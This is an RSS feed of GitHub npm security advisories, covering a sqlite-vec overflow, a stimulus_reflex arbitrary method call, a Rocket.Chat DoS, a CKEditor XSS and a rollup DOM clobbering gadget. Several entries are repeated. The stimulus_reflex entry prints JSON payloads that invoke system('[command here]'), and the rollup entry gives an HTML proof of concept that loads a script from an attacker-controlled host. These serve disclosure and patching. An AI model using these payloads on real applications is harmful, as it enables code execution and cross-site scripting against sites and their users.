<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/npm.rss</id>
    <title>Security Advisory for JavaScript packages hosted at npmjs.com</title>
    <updated>2024-09-26T08:01:30.421Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"/>
    <subtitle>Security Advisory for JavaScript packages hosted at npmjs.com on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[sqlite-vec] Heap-based Buffer Overflow in sqlite-vec]]></title>
        <id>https://github.com/advisories/GHSA-vrcx-gx3g-j3h8</id>
        <link href="https://github.com/advisories/GHSA-vrcx-gx3g-j3h8"/>
        <updated>2024-09-25T22:13:22.000Z</updated>
        <content type="html"><![CDATA[<p>sqlite-vec v0.1.1 was discovered to contain a heap buffer overflow via the npy_token_next function. This vulnerability allows attackers to cause a Denial of Service (DoS) via a crafted file.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-46488">https://nvd.nist.gov/vuln/detail/CVE-2024-46488</a></li>
<li><a href="https://github.com/VulnSphere/LLMVulnSphere/blob/main/VectorDB/sqlite-vec/OOBR_2.md">https://github.com/VulnSphere/LLMVulnSphere/blob/main/VectorDB/sqlite-vec/OOBR_2.md</a></li>
<li><a href="https://github.com/advisories/GHSA-vrcx-gx3g-j3h8">https://github.com/advisories/GHSA-vrcx-gx3g-j3h8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vrcx-gx3g-j3h8</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2024-09-25T18:31:21.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[stimulus_reflex] StimulusReflex arbitrary method call]]></title>
        <id>https://github.com/advisories/GHSA-f78j-4w3g-4q65</id>
        <link href="https://github.com/advisories/GHSA-f78j-4w3g-4q65"/>
        <updated>2024-09-25T20:56:25.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>More methods than expected can be called on reflex instances. Being able to call some of them has security implications.</p>
<h3 id="details">Details</h3>
<p>To invoke a reflex a websocket message of the following shape is sent:</p>
<pre><code class="language-json">{ 
  "target": "[class_name]#[method_name]", 
  "args": [] 
}
</code></pre>
<p>The server will proceed to instantiate <code>reflex</code> using the provided <code>class_name</code> as long as it extends <code>StimulusReflex::Reflex</code>.
It then attempts to call <code>method_name</code> on the instance with the provided arguments <a href="https://github.com/stimulusreflex/stimulus_reflex/blob/0211cad7d60fe96838587f159d657e44cee51b9b/app/channels/stimulus_reflex/channel.rb#L83">ref</a>:</p>
<pre><code class="language-ruby">method = reflex.method method_name
required_params = method.parameters.select { |(kind, _)| kind == :req }
optional_params = method.parameters.select { |(kind, _)| kind == :opt }

if arguments.size &gt;= required_params.size &amp;&amp; arguments.size &lt;= required_params.size + optional_params.size
  reflex.public_send(method_name, *arguments)
end
</code></pre>
<p>This is problematic as <code>reflex.method(method_name)</code> can be more methods than those explicitly specified by the developer in their reflex class. A good example is the <code>instance_variable_set</code> method.</p>
<details>

<summary>Read more</summary>
Let's imagine a reflex that uses `@user` as a trusted variable in an `after_reflex` callback.

<p>This variable can be overwritten using the following message:</p>
<pre><code class="language-json">{
  "target": "ChatReflex#instance_variable_set", 
  "args": ["@user", "&lt;admin-id&gt;"]
}
</code></pre>
<p>Here are other interesting methods that were found to be available for the <a href="https://github.com/hopsoft/stimulus_reflex_expo/blob/dcce8c36a6782d1e7f57f0e2766a3f6fd770b3b1/app/reflexes/chat_reflex.rb">ChatReflex sample reflex</a></p>
<ul>
<li><code>remote_byebug</code>: bind a debugging server</li>
<li><code>pry</code>: drop the process in a REPL session</li>
</ul>
<p>All in all, only counting  <code>:req</code> and <code>:opt</code> parameters helps.
For example around <a href="https://github.com/stimulusreflex/stimulus_reflex/blob/1f610b636abfed27de2c61104aebd1ac98180d5b/lib/stimulus_reflex/channel.rb#L41">version 1.0</a> only <code>.arity</code> was checked which allowed access to the <code>system</code> method (<code>.arity == -1</code>)</p>
<pre><code class="language-json">{
  "target": "ChatReflex#system", 
  "args": ["[command here]"]
}
</code></pre>
<p>Using <code>public_send</code> instead of <code>send</code> does not help but the following payloads <strong>do not</strong> work since <code>:rest</code> parameters are not counted in the current version</p>
<pre><code class="language-json">{
  "target": "ChatReflex#send", 
  "args": ["system", "[command here]"] 
}
</code></pre>
<pre><code class="language-json">{ 
  "target": "ChatReflex#instance_eval", 
  "args": ["system('[command here]')"]
}
</code></pre>
</details>

<p>Pre-versions of 3.5.0 added a <code>render_collection</code> method on reflexes with  a <code>:req</code> parameter. Calling this method could lead to arbitrary code execution:</p>
<pre><code class="language-json">{
  "target": "StimulusReflex::Reflex#render_collection", 
  "args": [
    { "inline":  "&lt;% system('[command here]') %&gt;" }
  ]
}
</code></pre>
<h3 id="patches">Patches</h3>
<p>Patches are <a href="https://rubygems.org/gems/stimulus_reflex">available on RubyGems</a> and on <a href="https://npmjs.org/package/stimulus_reflex">NPM</a>. </p>
<p>The patched versions are: </p>
<ul>
<li><a href="https://github.com/stimulusreflex/stimulus_reflex/releases/tag/v3.4.2"><code>3.4.2</code></a></li>
<li><a href="https://github.com/stimulusreflex/stimulus_reflex/releases/tag/v3.5.0.rc4"><code>3.5.0.rc4</code></a></li>
</ul>
<h3 id="workaround">Workaround</h3>
<p>You can add this guard to mitigate the issue if running an unpatched version of the library. </p>
<p>1.) Make sure all your reflexes inherit from the <code>ApplicationReflex</code> class
2.) Add this <code>before_reflex</code> callback to your <code>app/reflexes/application_reflex.rb</code> file:</p>
<pre><code class="language-ruby">class ApplicationReflex &lt; StimulusReflex::Reflex
  before_reflex do
    ancestors = self.class.ancestors[0..self.class.ancestors.index(StimulusReflex::Reflex) - 1]
    allowed = ancestors.any? { |a| a.public_instance_methods(false).any?(method_name.to_sym) }

    raise ArgumentError.new("Reflex method '#{method_name}' is not defined on class '#{self.class.name}' or on any of its ancestors") if !allowed
  end
end
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/stimulusreflex/stimulus_reflex/security/advisories/GHSA-f78j-4w3g-4q65">https://github.com/stimulusreflex/stimulus_reflex/security/advisories/GHSA-f78j-4w3g-4q65</a></li>
<li><a href="https://github.com/stimulusreflex/stimulus_reflex/commit/538582d240439aab76066c72335ea92096cd0c7f">https://github.com/stimulusreflex/stimulus_reflex/commit/538582d240439aab76066c72335ea92096cd0c7f</a></li>
<li><a href="https://github.com/stimulusreflex/stimulus_reflex/commit/d823d7348f9ca42eb6df25574f11974e4f5bc88c">https://github.com/stimulusreflex/stimulus_reflex/commit/d823d7348f9ca42eb6df25574f11974e4f5bc88c</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-28121">https://nvd.nist.gov/vuln/detail/CVE-2024-28121</a></li>
<li><a href="https://github.com/stimulusreflex/stimulus_reflex/blob/0211cad7d60fe96838587f159d657e44cee51b9b/app/channels/stimulus_reflex/channel.rb#L83">https://github.com/stimulusreflex/stimulus_reflex/blob/0211cad7d60fe96838587f159d657e44cee51b9b/app/channels/stimulus_reflex/channel.rb#L83</a></li>
<li><a href="https://github.com/stimulusreflex/stimulus_reflex/releases/tag/v3.4.2">https://github.com/stimulusreflex/stimulus_reflex/releases/tag/v3.4.2</a></li>
<li><a href="https://github.com/stimulusreflex/stimulus_reflex/releases/tag/v3.5.0.rc4">https://github.com/stimulusreflex/stimulus_reflex/releases/tag/v3.5.0.rc4</a></li>
<li><a href="http://seclists.org/fulldisclosure/2024/Mar/16">http://seclists.org/fulldisclosure/2024/Mar/16</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/stimulus_reflex/CVE-2024-28121.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/stimulus_reflex/CVE-2024-28121.yml</a></li>
<li><a href="https://github.com/advisories/GHSA-f78j-4w3g-4q65">https://github.com/advisories/GHSA-f78j-4w3g-4q65</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-f78j-4w3g-4q65</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-03-12T15:44:49.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@rocket.chat/message-parser] Denial of service in rocket chat message parser]]></title>
        <id>https://github.com/advisories/GHSA-6375-pg5j-8wph</id>
        <link href="https://github.com/advisories/GHSA-6375-pg5j-8wph"/>
        <updated>2024-09-25T18:51:17.000Z</updated>
        <content type="html"><![CDATA[<p>Rocket.Chat 6.12.0, 6.11.2, 6.10.5, 6.9.6, 6.8.6, 6.7.8, and earlier is vulnerable to denial of service (DoS). Attackers who craft messages with specific characters may crash the workspace due to an issue in the message parser.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-46935">https://nvd.nist.gov/vuln/detail/CVE-2024-46935</a></li>
<li><a href="https://github.com/RocketChat/Rocket.Chat/pull/33227">https://github.com/RocketChat/Rocket.Chat/pull/33227</a></li>
<li><a href="https://docs.rocket.chat/docs/rocketchat-security-fixes-updates-and-advisories">https://docs.rocket.chat/docs/rocketchat-security-fixes-updates-and-advisories</a></li>
<li><a href="https://github.com/RocketChat/Rocket.Chat/releases/tag/6.12.1">https://github.com/RocketChat/Rocket.Chat/releases/tag/6.12.1</a></li>
<li><a href="https://github.com/advisories/GHSA-6375-pg5j-8wph">https://github.com/advisories/GHSA-6375-pg5j-8wph</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6375-pg5j-8wph</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-09-25T03:30:36.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[ckeditor5-clipboard] Cross-site scripting (XSS) in the clipboard package]]></title>
        <id>https://github.com/advisories/GHSA-rgg8-g5x8-wr9v</id>
        <link href="https://github.com/advisories/GHSA-rgg8-g5x8-wr9v"/>
        <updated>2024-09-25T18:13:36.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>During a recent internal audit, a Cross-Site Scripting (XSS) vulnerability was identified in the CKEditor 5 clipboard package. This vulnerability could be triggered by a specific user action, leading to unauthorized JavaScript code execution, if the attacker managed to insert a malicious content into the editor, which might happen with a very specific editor configuration.</p>
<p>This vulnerability affects <strong>only</strong> installations where the editor configuration meets the following criteria:</p>
<ol>
<li>The <a href="https://ckeditor.com/docs/ckeditor5/latest/getting-started/setup/toolbar.html#block-toolbar"><strong>Block Toolbar</strong></a> plugin is enabled.</li>
<li>One of the following plugins is also enabled:<ul>
<li><a href="https://ckeditor.com/docs/ckeditor5/latest/features/html/general-html-support.html"><strong>General HTML Support</strong></a> with a configuration that permits unsafe markup.</li>
<li><a href="https://ckeditor.com/docs/ckeditor5/latest/features/html/html-embed.html"><strong>HTML Embed</strong></a>.</li>
</ul>
</li>
</ol>
<h3 id="patches">Patches</h3>
<p>The problem has been recognized and patched. The fix will be available in version 43.1.1.</p>
<h3 id="workarounds">Workarounds</h3>
<p>It's highly recommended to update to the version 43.1.1. However, if the update is not an option, we recommend disabling the block toolbar plugin.</p>
<h3 id="for-more-information">For more information</h3>
<p>Email us at <a href="mailto:security@cksource.com">security@cksource.com</a> if you have any questions or comments about this advisory.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/ckeditor/ckeditor5/security/advisories/GHSA-rgg8-g5x8-wr9v">https://github.com/ckeditor/ckeditor5/security/advisories/GHSA-rgg8-g5x8-wr9v</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-45613">https://nvd.nist.gov/vuln/detail/CVE-2024-45613</a></li>
<li><a href="https://github.com/ckeditor/ckeditor5/releases/tag/v43.1.1">https://github.com/ckeditor/ckeditor5/releases/tag/v43.1.1</a></li>
<li><a href="https://github.com/advisories/GHSA-rgg8-g5x8-wr9v">https://github.com/advisories/GHSA-rgg8-g5x8-wr9v</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rgg8-g5x8-wr9v</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-09-25T18:13:35.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[ckeditor5] Cross-site scripting (XSS) in the clipboard package]]></title>
        <id>https://github.com/advisories/GHSA-rgg8-g5x8-wr9v</id>
        <link href="https://github.com/advisories/GHSA-rgg8-g5x8-wr9v"/>
        <updated>2024-09-25T18:13:36.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>During a recent internal audit, a Cross-Site Scripting (XSS) vulnerability was identified in the CKEditor 5 clipboard package. This vulnerability could be triggered by a specific user action, leading to unauthorized JavaScript code execution, if the attacker managed to insert a malicious content into the editor, which might happen with a very specific editor configuration.</p>
<p>This vulnerability affects <strong>only</strong> installations where the editor configuration meets the following criteria:</p>
<ol>
<li>The <a href="https://ckeditor.com/docs/ckeditor5/latest/getting-started/setup/toolbar.html#block-toolbar"><strong>Block Toolbar</strong></a> plugin is enabled.</li>
<li>One of the following plugins is also enabled:<ul>
<li><a href="https://ckeditor.com/docs/ckeditor5/latest/features/html/general-html-support.html"><strong>General HTML Support</strong></a> with a configuration that permits unsafe markup.</li>
<li><a href="https://ckeditor.com/docs/ckeditor5/latest/features/html/html-embed.html"><strong>HTML Embed</strong></a>.</li>
</ul>
</li>
</ol>
<h3 id="patches">Patches</h3>
<p>The problem has been recognized and patched. The fix will be available in version 43.1.1.</p>
<h3 id="workarounds">Workarounds</h3>
<p>It's highly recommended to update to the version 43.1.1. However, if the update is not an option, we recommend disabling the block toolbar plugin.</p>
<h3 id="for-more-information">For more information</h3>
<p>Email us at <a href="mailto:security@cksource.com">security@cksource.com</a> if you have any questions or comments about this advisory.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/ckeditor/ckeditor5/security/advisories/GHSA-rgg8-g5x8-wr9v">https://github.com/ckeditor/ckeditor5/security/advisories/GHSA-rgg8-g5x8-wr9v</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-45613">https://nvd.nist.gov/vuln/detail/CVE-2024-45613</a></li>
<li><a href="https://github.com/ckeditor/ckeditor5/releases/tag/v43.1.1">https://github.com/ckeditor/ckeditor5/releases/tag/v43.1.1</a></li>
<li><a href="https://github.com/advisories/GHSA-rgg8-g5x8-wr9v">https://github.com/advisories/GHSA-rgg8-g5x8-wr9v</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rgg8-g5x8-wr9v</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-09-25T18:13:35.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[rollup] DOM Clobbering Gadget found in rollup bundled scripts that leads to XSS]]></title>
        <id>https://github.com/advisories/GHSA-gcx4-mw62-g8wm</id>
        <link href="https://github.com/advisories/GHSA-gcx4-mw62-g8wm"/>
        <updated>2024-09-23T22:11:05.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>A DOM Clobbering vulnerability was discovered in rollup when bundling scripts that use <code>import.meta.url</code> or with plugins that emit and reference asset files from code  in <code>cjs</code>/<code>umd</code>/<code>iife</code> format. The DOM Clobbering gadget can lead to cross-site scripting (XSS) in web pages where scriptless attacker-controlled HTML elements (e.g., an <code>img</code> tag with an unsanitized <code>name</code> attribute) are present.</p>
<p>It's worth noting that similar issues in other popular bundlers like Webpack (<a href="https://github.com/webpack/webpack/security/advisories/GHSA-4vvj-4cpr-p986">CVE-2024-43788</a>) have been reported, which might serve as a good reference.</p>
<h3 id="details">Details</h3>
<h4 id="backgrounds">Backgrounds</h4>
<p>DOM Clobbering is a type of code-reuse attack where the attacker first embeds a piece of non-script, seemingly benign HTML markups in the webpage (e.g. through a post or comment) and leverages the gadgets (pieces of js code) living in the existing javascript code to transform it into executable code. More for information about DOM Clobbering, here are some references:</p>
<p>[1] <a href="https://scnps.co/papers/sp23_domclob.pdf">https://scnps.co/papers/sp23_domclob.pdf</a>
[2] <a href="https://research.securitum.com/xss-in-amp4email-dom-clobbering/">https://research.securitum.com/xss-in-amp4email-dom-clobbering/</a></p>
<h4 id="gadget-found-in-rollup">Gadget found in <code>rollup</code></h4>
<p>A DOM Clobbering vulnerability in <code>rollup</code> bundled scripts was identified, particularly when the scripts uses <code>import.meta</code> and set output in format of  <code>cjs</code>/<code>umd</code>/<code>iife</code>. In such cases, <code>rollup</code> replaces meta property with the URL retrieved from <code>document.currentScript</code>.</p>
<p><a href="https://github.com/rollup/rollup/blob/b86ffd776cfa906573d36c3f019316d02445d9ef/src/ast/nodes/MetaProperty.ts#L157-L162">https://github.com/rollup/rollup/blob/b86ffd776cfa906573d36c3f019316d02445d9ef/src/ast/nodes/MetaProperty.ts#L157-L162</a></p>
<p><a href="https://github.com/rollup/rollup/blob/b86ffd776cfa906573d36c3f019316d02445d9ef/src/ast/nodes/MetaProperty.ts#L180-L185">https://github.com/rollup/rollup/blob/b86ffd776cfa906573d36c3f019316d02445d9ef/src/ast/nodes/MetaProperty.ts#L180-L185</a></p>
<p>However, this implementation is vulnerable to a DOM Clobbering attack. The <code>document.currentScript</code> lookup can be shadowed by an attacker via the browser's named DOM tree element access mechanism. This manipulation allows an attacker to replace the intended script element with a malicious HTML element. When this happens, the <code>src</code> attribute of the attacker-controlled element (e.g., an <code>img</code> tag ) is used as the URL for importing scripts, potentially leading to the dynamic loading of scripts from an attacker-controlled server.</p>
<h3 id="poc">PoC</h3>
<p>Considering a website that contains the following <code>main.js</code> script, the devloper decides to use the <code>rollup</code> to bundle up the program: <code>rollup main.js --format cjs --file bundle.js</code>.</p>
<pre><code>var s = document.createElement('script')
s.src = import.meta.url + 'extra.js'
document.head.append(s)
</code></pre>
<p>The output <code>bundle.js</code> is shown in the following code snippet.</p>
<pre><code>'use strict';

var _documentCurrentScript = typeof document !== 'undefined' ? document.currentScript : null;
var s = document.createElement('script');
s.src = (typeof document === 'undefined' ? require('u' + 'rl').pathToFileURL(__filename).href : (_documentCurrentScript &amp;&amp; False &amp;&amp; _documentCurrentScript.src || new URL('bundle.js', document.baseURI).href)) + 'extra.js';
document.head.append(s);
</code></pre>
<p>Adding the <code>rollup</code> bundled script, <code>bundle.js</code>, as part of the web page source code, the page could load the <code>extra.js</code> file from the attacker's domain, <code>attacker.controlled.server</code> due to the introduced gadget during bundling. The attacker only needs to insert an <code>img</code> tag with the name attribute set to <code>currentScript</code>. This can be done through a website's feature that allows users to embed certain script-less HTML (e.g., markdown renderers, web email clients, forums) or via an HTML injection vulnerability in third-party JavaScript loaded on the page.</p>
<pre><code>&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
  &lt;title&gt;rollup Example&lt;/title&gt;
  &lt;!-- Attacker-controlled Script-less HTML Element starts--!&gt;
  &lt;img name="currentScript" src="https://attacker.controlled.server/"&gt;&lt;/img&gt;
  &lt;!-- Attacker-controlled Script-less HTML Element ends--!&gt;
&lt;/head&gt;
&lt;script type="module" crossorigin src="bundle.js"&gt;&lt;/script&gt;
&lt;body&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<h3 id="impact">Impact</h3>
<p>This vulnerability can result in cross-site scripting (XSS) attacks on websites that include rollup-bundled files (configured with an output format of <code>cjs</code>, <code>iife</code>, or <code>umd</code> and use <code>import.meta</code>) and allow users to inject certain scriptless HTML tags without properly sanitizing the <code>name</code> or <code>id</code> attributes.</p>
<h3 id="patch">Patch</h3>
<p>Patching the following two functions with type checking would be effective mitigations against DOM Clobbering attack.</p>
<pre><code>const getRelativeUrlFromDocument = (relativePath: string, umd = false) =&gt;
    getResolveUrl(
        `'${escapeId(relativePath)}', ${
            umd ? `typeof document === 'undefined' ? location.href : ` : ''
        }document.currentScript &amp;&amp; document.currentScript.tagName.toUpperCase() === 'SCRIPT' &amp;&amp; document.currentScript.src || document.baseURI`
    );
</code></pre>
<pre><code>const getUrlFromDocument = (chunkId: string, umd = false) =&gt;
    `${
        umd ? `typeof document === 'undefined' ? location.href : ` : ''
    }(${DOCUMENT_CURRENT_SCRIPT} &amp;&amp; ${DOCUMENT_CURRENT_SCRIPT}.tagName.toUpperCase() === 'SCRIPT' &amp;&amp;${DOCUMENT_CURRENT_SCRIPT}.src || new URL('${escapeId(
        chunkId
    )}', document.baseURI).href)`;
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/rollup/rollup/security/advisories/GHSA-gcx4-mw62-g8wm">https://github.com/rollup/rollup/security/advisories/GHSA-gcx4-mw62-g8wm</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-47068">https://nvd.nist.gov/vuln/detail/CVE-2024-47068</a></li>
<li><a href="https://github.com/rollup/rollup/commit/2ef77c00ec2635d42697cff2c0567ccc8db34fb4">https://github.com/rollup/rollup/commit/2ef77c00ec2635d42697cff2c0567ccc8db34fb4</a></li>
<li><a href="https://github.com/rollup/rollup/commit/e2552c9e955e0a61f70f508200ee9f752f85a541">https://github.com/rollup/rollup/commit/e2552c9e955e0a61f70f508200ee9f752f85a541</a></li>
<li><a href="https://github.com/rollup/rollup/blob/b86ffd776cfa906573d36c3f019316d02445d9ef/src/ast/nodes/MetaProperty.ts#L157-L162">https://github.com/rollup/rollup/blob/b86ffd776cfa906573d36c3f019316d02445d9ef/src/ast/nodes/MetaProperty.ts#L157-L162</a></li>
<li><a href="https://github.com/rollup/rollup/blob/b86ffd776cfa906573d36c3f019316d02445d9ef/src/ast/nodes/MetaProperty.ts#L180-L185">https://github.com/rollup/rollup/blob/b86ffd776cfa906573d36c3f019316d02445d9ef/src/ast/nodes/MetaProperty.ts#L180-L185</a></li>
<li><a href="https://github.com/advisories/GHSA-gcx4-mw62-g8wm">https://github.com/advisories/GHSA-gcx4-mw62-g8wm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-gcx4-mw62-g8wm</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-09-23T22:11:02.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[rollup] DOM Clobbering Gadget found in rollup bundled scripts that leads to XSS]]></title>
        <id>https://github.com/advisories/GHSA-gcx4-mw62-g8wm</id>
        <link href="https://github.com/advisories/GHSA-gcx4-mw62-g8wm"/>
        <updated>2024-09-23T22:11:05.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>A DOM Clobbering vulnerability was discovered in rollup when bundling scripts that use <code>import.meta.url</code> or with plugins that emit and reference asset files from code  in <code>cjs</code>/<code>umd</code>/<code>iife</code> format. The DOM Clobbering gadget can lead to cross-site scripting (XSS) in web pages where scriptless attacker-controlled HTML elements (e.g., an <code>img</code> tag with an unsanitized <code>name</code> attribute) are present.</p>
<p>It's worth noting that similar issues in other popular bundlers like Webpack (<a href="https://github.com/webpack/webpack/security/advisories/GHSA-4vvj-4cpr-p986">CVE-2024-43788</a>) have been reported, which might serve as a good reference.</p>
<h3 id="details">Details</h3>
<h4 id="backgrounds">Backgrounds</h4>
<p>DOM Clobbering is a type of code-reuse attack where the attacker first embeds a piece of non-script, seemingly benign HTML markups in the webpage (e.g. through a post or comment) and leverages the gadgets (pieces of js code) living in the existing javascript code to transform it into executable code. More for information about DOM Clobbering, here are some references:</p>
<p>[1] <a href="https://scnps.co/papers/sp23_domclob.pdf">https://scnps.co/papers/sp23_domclob.pdf</a>
[2] <a href="https://research.securitum.com/xss-in-amp4email-dom-clobbering/">https://research.securitum.com/xss-in-amp4email-dom-clobbering/</a></p>
<h4 id="gadget-found-in-rollup">Gadget found in <code>rollup</code></h4>
<p>A DOM Clobbering vulnerability in <code>rollup</code> bundled scripts was identified, particularly when the scripts uses <code>import.meta</code> and set output in format of  <code>cjs</code>/<code>umd</code>/<code>iife</code>. In such cases, <code>rollup</code> replaces meta property with the URL retrieved from <code>document.currentScript</code>.</p>
<p><a href="https://github.com/rollup/rollup/blob/b86ffd776cfa906573d36c3f019316d02445d9ef/src/ast/nodes/MetaProperty.ts#L157-L162">https://github.com/rollup/rollup/blob/b86ffd776cfa906573d36c3f019316d02445d9ef/src/ast/nodes/MetaProperty.ts#L157-L162</a></p>
<p><a href="https://github.com/rollup/rollup/blob/b86ffd776cfa906573d36c3f019316d02445d9ef/src/ast/nodes/MetaProperty.ts#L180-L185">https://github.com/rollup/rollup/blob/b86ffd776cfa906573d36c3f019316d02445d9ef/src/ast/nodes/MetaProperty.ts#L180-L185</a></p>
<p>However, this implementation is vulnerable to a DOM Clobbering attack. The <code>document.currentScript</code> lookup can be shadowed by an attacker via the browser's named DOM tree element access mechanism. This manipulation allows an attacker to replace the intended script element with a malicious HTML element. When this happens, the <code>src</code> attribute of the attacker-controlled element (e.g., an <code>img</code> tag ) is used as the URL for importing scripts, potentially leading to the dynamic loading of scripts from an attacker-controlled server.</p>
<h3 id="poc">PoC</h3>
<p>Considering a website that contains the following <code>main.js</code> script, the devloper decides to use the <code>rollup</code> to bundle up the program: <code>rollup main.js --format cjs --file bundle.js</code>.</p>
<pre><code>var s = document.createElement('script')
s.src = import.meta.url + 'extra.js'
document.head.append(s)
</code></pre>
<p>The output <code>bundle.js</code> is shown in the following code snippet.</p>
<pre><code>'use strict';

var _documentCurrentScript = typeof document !== 'undefined' ? document.currentScript : null;
var s = document.createElement('script');
s.src = (typeof document === 'undefined' ? require('u' + 'rl').pathToFileURL(__filename).href : (_documentCurrentScript &amp;&amp; False &amp;&amp; _documentCurrentScript.src || new URL('bundle.js', document.baseURI).href)) + 'extra.js';
document.head.append(s);
</code></pre>
<p>Adding the <code>rollup</code> bundled script, <code>bundle.js</code>, as part of the web page source code, the page could load the <code>extra.js</code> file from the attacker's domain, <code>attacker.controlled.server</code> due to the introduced gadget during bundling. The attacker only needs to insert an <code>img</code> tag with the name attribute set to <code>currentScript</code>. This can be done through a website's feature that allows users to embed certain script-less HTML (e.g., markdown renderers, web email clients, forums) or via an HTML injection vulnerability in third-party JavaScript loaded on the page.</p>
<pre><code>&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
  &lt;title&gt;rollup Example&lt;/title&gt;
  &lt;!-- Attacker-controlled Script-less HTML Element starts--!&gt;
  &lt;img name="currentScript" src="https://attacker.controlled.server/"&gt;&lt;/img&gt;
  &lt;!-- Attacker-controlled Script-less HTML Element ends--!&gt;
&lt;/head&gt;
&lt;script type="module" crossorigin src="bundle.js"&gt;&lt;/script&gt;
&lt;body&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<h3 id="impact">Impact</h3>
<p>This vulnerability can result in cross-site scripting (XSS) attacks on websites that include rollup-bundled files (configured with an output format of <code>cjs</code>, <code>iife</code>, or <code>umd</code> and use <code>import.meta</code>) and allow users to inject certain scriptless HTML tags without properly sanitizing the <code>name</code> or <code>id</code> attributes.</p>
<h3 id="patch">Patch</h3>
<p>Patching the following two functions with type checking would be effective mitigations against DOM Clobbering attack.</p>
<pre><code>const getRelativeUrlFromDocument = (relativePath: string, umd = false) =&gt;
    getResolveUrl(
        `'${escapeId(relativePath)}', ${
            umd ? `typeof document === 'undefined' ? location.href : ` : ''
        }document.currentScript &amp;&amp; document.currentScript.tagName.toUpperCase() === 'SCRIPT' &amp;&amp; document.currentScript.src || document.baseURI`
    );
</code></pre>
<pre><code>const getUrlFromDocument = (chunkId: string, umd = false) =&gt;
    `${
        umd ? `typeof document === 'undefined' ? location.href : ` : ''
    }(${DOCUMENT_CURRENT_SCRIPT} &amp;&amp; ${DOCUMENT_CURRENT_SCRIPT}.tagName.toUpperCase() === 'SCRIPT' &amp;&amp;${DOCUMENT_CURRENT_SCRIPT}.src || new URL('${escapeId(
        chunkId
    )}', document.baseURI).href)`;
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/rollup/rollup/security/advisories/GHSA-gcx4-mw62-g8wm">https://github.com/rollup/rollup/security/advisories/GHSA-gcx4-mw62-g8wm</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-47068">https://nvd.nist.gov/vuln/detail/CVE-2024-47068</a></li>
<li><a href="https://github.com/rollup/rollup/commit/2ef77c00ec2635d42697cff2c0567ccc8db34fb4">https://github.com/rollup/rollup/commit/2ef77c00ec2635d42697cff2c0567ccc8db34fb4</a></li>
<li><a href="https://github.com/rollup/rollup/commit/e2552c9e955e0a61f70f508200ee9f752f85a541">https://github.com/rollup/rollup/commit/e2552c9e955e0a61f70f508200ee9f752f85a541</a></li>
<li><a href="https://github.com/rollup/rollup/blob/b86ffd776cfa906573d36c3f019316d02445d9ef/src/ast/nodes/MetaProperty.ts#L157-L162">https://github.com/rollup/rollup/blob/b86ffd776cfa906573d36c3f019316d02445d9ef/src/ast/nodes/MetaProperty.ts#L157-L162</a></li>
<li><a href="https://github.com/rollup/rollup/blob/b86ffd776cfa906573d36c3f019316d02445d9ef/src/ast/nodes/MetaProperty.ts#L180-L185">https://github.com/rollup/rollup/blob/b86ffd776cfa906573d36c3f019316d02445d9ef/src/ast/nodes/MetaProperty.ts#L180-L185</a></li>
